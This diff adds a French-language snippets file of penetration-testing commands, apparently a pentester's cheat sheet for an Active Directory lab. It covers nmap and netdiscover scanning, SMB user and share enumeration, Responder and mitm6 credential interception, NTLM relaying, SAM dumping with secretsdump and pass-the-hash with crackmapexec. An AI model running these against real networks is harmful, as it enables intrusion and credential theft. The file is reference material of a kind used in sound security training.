@@ -1,0 +1,162 @@
+
+[[Snippets]]
+  Description = "netdiscover, permet de découvrir les adresses IP sur un reseau"
+  Output = ""
+  Tag = []
+  command = "sudo netdiscover -i <notre-interface(eth0)> -r <ip(192.168.1.0)>"
+
+[[Snippets]]
+  Description = "nmap, sniffer les ports d'une ip"
+  Output = ""
+  Tag = []
+  command = "nmap -sT <adresse-ip>/<cidr>"
+
+[[Snippets]]
+  Description = "nmap, avoir toutes les infos d'une adresse IP"
+  Output = ""
+  Tag = []
+  command = "nmap -A <adresse-ip>"
+
+[[Snippets]]
+  Description = "nmap, permet de faire un scan discret -sS et de détecter la version des services -sV"
+  Output = ""
+  Tag = []
+  command = "sudo nmap -sS -sV <adresse_ip>"
+
+[[Snippets]]
+  Description = "nmap, fait un scan classique (non discret)"
+  Output = ""
+  Tag = []
+  command = "nmap -sT <IP(192.168.10.0)>/<CIDR>"
+
+[[Snippets]]
+  Description = "nmap, list les machines actives sur un réseau sans scanner leurs ports"
+  Output = ""
+  Tag = []
+  command = "nmap -sn <IP(192.168.10.0)>/<CIDR>"
+
+[[Snippets]]
+  Description = "nmap, essaye de detecter l'OS"
+  Output = ""
+  Tag = []
+  command = "sudo nmap -O <IP(192.168.10.0)>/<CIDR>"
+
+[[Snippets]]
+  Description = "nmap, scan avancé de l’IP cible en forçant le scan des ports, en cherchant les vulnérabilités connues, en identifiant l’OS et les services, et en bypassant la détection d’hôtes, ignore le ping (-Pn)"
+  Output = ""
+  Tag = []
+  command = "nmap -A --script vuln,safe --script-args=unsafe=1 --top-ports <Port(1000)> -Pn <adresse-ip>"
+
+[[Snippets]]
+  Description = "nmap, permet d'identifier le(s) serveurs DHCP"
+  Output = ""
+  Tag = []
+  command = "sudo nmap --script broadcast-dhcp-discover"
+
+[[Snippets]]
+  Description = "nbtscan, identifie les machines Windows sur un réseau"
+  Output = ""
+  Tag = []
+  command = "nbtscan <IP(192.168.150.1)>/<CIDR>"
+
+[[Snippets]]
+  Description = "nmap, permet de scanner tous les services sur tout les ports"
+  Output = ""
+  Tag = []
+  command = "nmap -A <IP(192.168.167.131)> -p-"
+
+[[Snippets]]
+  Description = "nmap, fait un scan UDP sur tout les ports"
+  Output = ""
+  Tag = []
+  command = "sudo nmap -sU <adresse-ip> -p-"
+
+[[Snippets]]
+  Description = "enum4linux, permet de scanner un hote windows en profondeur (-a)"
+  Output = ""
+  Tag = []
+  command = "enum4linux -a <adresse-ip>"
+
+[[Snippets]]
+  Description = "dirb, permet de découvrir tout les dossiers d'un site web"
+  Output = ""
+  Tag = []
+  command = "dirb <http-ou-https>://<adresse-ip>"
+
+[[Snippets]]
+  Description = "enum4linux, permet d'enumerer les utilisateurs windows via SMB"
+  Output = ""
+  Tag = []
+  command = "enum4linux -U <IP>"
+
+[[Snippets]]
+  Description = "responder, outil de man-in-the-middle (MITM) utilisé pour capturer des requêtes sur le réseau local (LAN), en particulier celles liées à des services tels que NetBIOS, LLMNR, NBT-NS, et MDNS. Il exploite les vulnérabilités de protocoles non sécurisés pour intercepter des informations sensibles comme des identifiants et mots de passe non chiffrés"
+  Output = ""
+  Tag = []
+  command = "sudo responder -I <interface(eth0)> <--lm(permet de downgrade)>"
+
+[[Snippets]]
+  Description = "crackmapexec, permet de récupérer les users en utilisant le service SMB sur une IP"
+  Output = ""
+  Tag = []
+  command = "crackmapexec smb <adresse-ip> --users"
+
+[[Snippets]]
+  Description = "crackmapexec, permet de récupérer les partages (repertoire partagee) en utilisant le service SMB sur une IP"
+  Output = ""
+  Tag = []
+  command = "crackmapexec smb <adresse-ip> --shares"
+
+[[Snippets]]
+  Description = "smbclient.py, permet d'avoir accès au(x) partage(s) sur une adresse IP ; ATTENTION il faut le mdp de l'utilisateur"
+  Output = ""
+  Tag = []
+  command = "python3 smbclient.py <nom-du-domaine(north.sevenkingdoms.local)>/<nom-utilisateur-sam-account-name>@<adresse-ip>"
+
+[[Snippets]]
+  Description = "smbmap, permet d'avoir accès au(x) partage(s) sur une adresse IP ; ATTENTION il faut le mdp de l'utilisateur"
+  Output = ""
+  Tag = []
+  command = "smbmap -u <nom-utilisateur> -p <mot-de-passe> -H <IP(192.168.86.61)>"
+
+[[Snippets]]
+  Description = "bloodhound, permet d'avoir une sortie zip d'un domaine pour bloodhound"
+  Output = ""
+  Tag = []
+  command = "bloodhound-python -d <nom-du-domaine> --zip -c All -dc <nom-du-domain-controller> -ns <IP-du-domaine> -u '<user>' -p '<password>'"
+
+[[Snippets]]
+  Description = "proxychains4, permet de dump la base SAM"
+  Output = ""
+  Tag = []
+  command = "proxychains4 -q secretsdump.py <domain>/<user>:toto@<IP>"
+
+[[Snippets]]
+  Description = "dig, permet de faire un transfert de zone DNS"
+  Output = ""
+  Tag = []
+  command = "dig -axfr <nom-de-domaine>@<nom-server>"
+
+[[Snippets]]
+  Description = "ldapsearch, permet d'identifier les informations de configuration de base du serveur LDAP (NETLOGON,SYSVOL,IPC$...)"
+  Output = ""
+  Tag = []
+  command = "ldapsearch -x -H ldap://<IP-du-domaine> -s base"
+
+[[Snippets]]
+  Description = "mitm6, intercept les communications (MITM) d'un domaine"
+  Output = ""
+  Tag = []
+  command = "sudo mitm6 -d <nom-du-domaine> -I <Interface(eth0)>"
+
+[[Snippets]]
+  Description = "ntlmrelay.py, permet de relayer une authentification NTLM capturée vers un autre service"
+  Output = ""
+  Tag = []
+  command = "ntmlrelayx.py -tf <targets.txt> -smb2support -socks"
+
+[[Snippets]]
+  Description = "crackmapexec, permet de faire une attaque PathTheHash ; NTLMV2 est le hash du password du user"
+  Output = ""
+  Tag = []
+  command = "crackmapexec smb <IP> -u '<user>' -H <NTLMV2> --shares"
